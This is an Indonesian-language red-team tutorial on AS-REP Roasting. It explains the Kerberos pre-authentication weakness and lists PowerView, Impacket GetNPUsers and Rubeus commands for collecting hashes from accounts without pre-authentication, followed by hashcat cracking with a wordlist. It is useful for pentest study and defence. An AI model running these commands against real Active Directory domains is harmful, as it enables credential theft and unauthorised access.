---
title: '[Kerberos] AS-REP Roasting'
date: 2022-02-05 08:39:22 +0800
categories: [Active Directory, Post Compromise Attack]
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos, impacket, rubeus]     # TAG names should always be lowercase
author: nairpaa
---

**ASREP Roasting** adalah teknik lain yang bisa digunakan untuk mengeksploitasi cara Kerberos bekerja. Teknik ini bisa digunakan kepada pengguna yang tidak mengaktifkan Kerberos *pre-authentication*.

![AS-REP Roasting](https://stealthbits.com/wp-content/uploads/2019/06/ASREP-1.png)

*Pre-authentication* adalah metode yang digunakan oleh Kerberos untuk mengonfirmasi identitas pengguna sebelum mengeluarkan *Ticket Granting Ticket* (TGT). 

Jika *pre-authentication* dinonaktifkan, ini berarti bahwa siapa pun dapat meminta *Authentication Service Response* (AS-REP) untuk pengguna tersebut, dan tiket tersebut di-*crack* secara offline untuk mendapatkan password *plaintext*-nya.

## 0x1 - Exploitation Stages

### Step 1: ASREPRoastable Enumeration

Seperti halnya [kerberoasting](/posts/kerberoasting), kita tidak ingin melakukan *asreproast* pada setiap akun di domain.

```powershell
# Enumerasi ASREPRoastable menggunakan PowerView
PS > . .\PowerView.ps1
PS > Get-NetUser -PreauthNotRequired
```

### Step 2: ASREP Roasting

#### A. Impacket

```bash
# Remote, hanya membutuhkan username (tanpa password)
➜ GetNPUsers.py <domain>/ -usersfile <users.txt> -format <hashcat|john> -outputfile <output.txt> -no-pass -dc-ip
```

#### B. Rubeus

```powershell
PS > Rubeus.exe asreproast /user:squid_svc /nowrap
```

## 0x2 - Crack the Ticket

```bash
➜ hashcat -m 18200 pass.hash /usr/share/wordlists/rockyou.txt
```

---

## 0x3 - References

- https://stealthbits.com/blog/cracking-active-directory-passwords-with-as-rep-roasting/
- https://akimbocore.com/article/asrep-roasting/




